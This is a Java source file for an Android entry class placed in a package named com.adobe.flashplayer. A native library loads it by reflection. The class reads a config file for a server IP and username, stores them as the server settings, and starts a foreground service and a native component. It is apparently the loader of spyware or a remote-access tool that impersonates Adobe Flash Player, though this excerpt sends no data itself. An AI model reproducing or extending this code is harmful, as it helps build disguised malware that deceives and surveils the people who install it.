package com.adobe.flashplayer;

import java.io.File;
import java.io.FileInputStream;
import org.json.JSONObject;
import com.authority.AuthoritySettings;
import com.main.ForegroundService;
import com.plugin.GetActivity;
import com.setup.NetworkSetup;
import com.utils.PrefOper;
import android.app.Activity;
import android.content.Context;
import android.util.Log;

public class JarEntry {

	private static String TAG = "JarEntry";

	
	//jmethodID enterclassinit = env->GetMethodID(javaenterclass, "<init>", "()V");
	//entry class from so must had void dummy constructor to be reflected invoked by so
	//without this constructor,Class.forName(xxx) will cause exception,
	//Pending exception java.lang.NoSuchMethodError: no non-static method com.adobe.flashplayer/.<init>
	public JarEntry(){
		Log.e("JarEntry", "init");
	}
	
	
	public void start(Context context){
		start(context,"");
	}
	
	public void start(Context context,String path){
		try {
			Log.e(TAG,"jar entry start");
			
			PrefOper.setValue(context, ForegroundService.PARAMCONFIG_FileName,
					ForegroundService.SETUPMODE,ForegroundService.SETUPMODE_JAR);
			
			if (path != null && path.equals("")==false) {
				if (path.endsWith("/") == false) {
					path += "/";
				}
			}
			
			PrefOper.setValue(context, ForegroundService.PARAMCONFIG_FileName,ForegroundService.CFGPLUGINPATH,path);
			
			String install = PrefOper.getValue(context, ForegroundService.PARAMCONFIG_FileName, ForegroundService.UNINSTALLFLAG);
			if(install.equals("true")){
				return ;
			}
			
			try {
				File file = new File(path + NetworkSetup.CONFIG_FILENAME);
				if (file.exists()) {
					int len = (int)file.length();
					byte[] buf = new byte[len];
					
					FileInputStream fin = new FileInputStream(file);
					fin.read(buf,0,len);
					fin.close();
					
					JSONObject json = new JSONObject(new String(buf));
					String ip = json.optString("ip");
					
					if (ip != null && ip.equals("") == false) {
						PrefOper.setValue(context, ForegroundService.PARAMCONFIG_FileName, 
								ForegroundService.CFGSERVERIP,ip);
					}
					String username = json.optString("username");
					if (username != null && username.equals("") == false) {
						PrefOper.setValue(context, ForegroundService.PARAMCONFIG_FileName, 
								ForegroundService.CFGUSERNAME,username);
					}
				}
			} catch (Exception e) {
				e.printStackTrace();
			}
			
			SoEntry.start(context,1);
			
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	public void startActivity(Activity activity){
		Log.e(TAG,"startActivity");
		try {
			if (activity != null && (activity instanceof Activity) ) {
				Context context = GetActivity.getContext();
				AuthoritySettings.checkPluginPermission(activity,context);
				start((Context)activity);
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	

}
